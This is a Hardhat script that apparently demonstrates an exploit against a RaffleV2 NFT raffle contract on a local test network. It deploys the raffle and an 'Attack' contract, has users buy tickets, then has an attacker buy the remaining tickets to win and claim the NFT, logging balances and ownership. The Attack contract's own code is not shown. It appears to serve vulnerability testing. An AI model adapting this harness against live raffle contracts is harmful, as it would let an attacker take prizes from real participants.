import { ethers, upgrades } from "hardhat";
import * as types from "../../typechain-types";
import { providers } from "ethers";

async function main() {
  const [owner, user1, user2, user3, attacker] = await ethers.getSigners();

  // deploy
  const RaffleC = await ethers.getContractFactory("RaffleV2");
  const raffleC = await upgrades.deployProxy(RaffleC, [100, ethers.utils.parseEther("0.1"), 1], {
    initializer: "initialize",
    unsafeAllow: ["constructor"],
  });
  await raffleC.deployed();

  const AttackC = await ethers.getContractFactory("Attack");
  const attackC = await AttackC.deploy(raffleC.address);
  const receipt = await attackC.deployed();

  const NftC = await ethers.getContractFactory("TestToken");
  const nftC = await NftC.deploy("TestToken", "TTK");
  await nftC.deployed();

  // mint a nft
  const tokenId = 10;
  const mintTx = await nftC.connect(owner).mint(tokenId);
  await mintTx.wait();

  // list nft
  const listTx = await raffleC.connect(owner).listNft(nftC.address);
  await listTx.wait();

  // register Raffle
  const approveTx = await nftC.approve(raffleC.address, tokenId);
  await approveTx.wait();

  const totalTickets = 10;
  const ticketPrice = ethers.utils.parseEther("1");
  const day = 1;
  const registerTx = await raffleC
    .connect(owner)
    .registerRaffle(nftC.address, tokenId, totalTickets, ticketPrice, day);
  await registerTx.wait();

  //  users buy tickets
  const raffleId = 0;
  let winner: string;

  const buyTx1 = await raffleC
    .connect(user1)
    .buyTickets(raffleId, 2, { value: ticketPrice.mul(2) });
  await buyTx1.wait();
  winner = await raffleC.getWinner(raffleId);
  console.log("@@1st", winner);

  const buyTx2 = await raffleC
    .connect(user2)
    .buyTickets(raffleId, 1, { value: ticketPrice.mul(1) });
  await buyTx2.wait();
  winner = await raffleC.getWinner(raffleId);
  console.log("@@2st", winner);

  const buyTx3 = await raffleC
    .connect(user3)
    .buyTickets(raffleId, 2, { value: ticketPrice.mul(2) });
  await buyTx3.wait();
  winner = await raffleC.getWinner(raffleId);
  console.log("@@3st", winner);

  // attack
  const raffleInfo = await raffleC.getRaffleInfo(raffleId);
  const leftTickest = raffleInfo.leftTickets;

  let attackerBal = await attacker.getBalance();
  console.log("@@ before balance: ", ethers.utils.formatEther(attackerBal));

  const attackTx = await attackC
    .connect(attacker)
    .attack(raffleId, { value: ticketPrice.mul(leftTickest) });
  await attackTx.wait();

  attackerBal = await attacker.getBalance();
  const filter = attackC.filters.AttackEvent();
  const isTriggered = (await attackC.queryFilter(filter))[0].args.isTriggered;

  if (isTriggered) {
    const claimTx = await attackC.connect(attacker).claimNfts();
    await claimTx.wait();
    winner = await raffleC.getWinner(raffleId);
    console.log("@@ attack CA: ", attackC.address);
    console.log("@@ winner address: ", winner);
    console.log("@@ attacker address: ", attacker.address);
    console.log("@@ owner of raffle nft: ", await nftC.ownerOf(tokenId));
  }

  console.log("@@ afterBal balance: ", ethers.utils.formatEther(attackerBal));
}

main().catch((error) => {
  console.log(error);
  process.exit(1);
});
